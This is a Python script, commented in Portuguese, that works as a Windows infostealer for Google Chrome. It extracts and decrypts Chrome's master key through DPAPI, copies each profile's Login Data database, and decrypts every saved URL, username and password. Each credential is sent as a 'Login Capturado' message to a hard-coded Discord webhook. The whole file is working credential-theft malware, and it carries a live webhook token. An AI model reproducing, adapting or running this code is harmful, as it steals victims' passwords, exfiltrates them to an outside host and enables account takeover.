import os
import re
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
import requests

# Webhook do Discord
DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1327447082750972036/e97EtoFVdUi8MPsAL3Ncwg8mc8r3HAYptPNTYn8E0lPFYKDj8OF0ud_hl3G6iZcMZ-9Z'

# Função para enviar a mensagem para o Discord
def send_to_discord(message):
    data = {
        "content": message
    }
    try:
        response = requests.post(DISCORD_WEBHOOK_URL, json=data)
        if response.status_code == 204:
            print("Mensagem enviada com sucesso para o Discord!")
        else:
            print(f"Erro ao enviar mensagem: {response.status_code}")
    except Exception as e:
        print(f"Erro na solicitação do Discord: {str(e)}")

# Funções já existentes...

CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State" % (os.environ['USERPROFILE']))
CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data" % (os.environ['USERPROFILE']))

def get_secret_key():
    try:
        with open(CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
            local_state = json.load(f)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        print(f"[ERR] {str(e)}")
        return None

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(ciphertext, secret_key):
    try:
        iv = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = generate_cipher(secret_key, iv)
        decrypted_pass = cipher.decrypt(encrypted_password).decode()
        return decrypted_pass
    except Exception as e:
        print(f"[ERR] {str(e)}")
        return ""

def get_db_connection(chrome_path_login_db):
    try:
        shutil.copy2(chrome_path_login_db, "Loginvault.db")
        return sqlite3.connect("Loginvault.db")
    except Exception as e:
        print(f"[ERR] {str(e)}")
        return None

# Execução principal
if __name__ == '__main__':
    try:
        secret_key = get_secret_key()
        folders = [folder for folder in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$", folder)]
        
        for folder in folders:
            chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data" % (CHROME_PATH, folder))
            conn = get_db_connection(chrome_path_login_db)
            
            if secret_key and conn:
                cursor = conn.cursor()
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                
                for index, login in enumerate(cursor.fetchall()):
                    url, username, ciphertext = login
                    if url and username and ciphertext:
                        decrypted_password = decrypt_password(ciphertext, secret_key)
                        message = f"🔐 **Login Capturado** 🔐\n**URL:** {url}\n**Usuário:** {username}\n**Senha:** {decrypted_password}"
                        send_to_discord(message)
                
                cursor.close()
                conn.close()
                os.remove("Loginvault.db")
    except Exception as e:
        print(f"[ERR] {str(e)}")
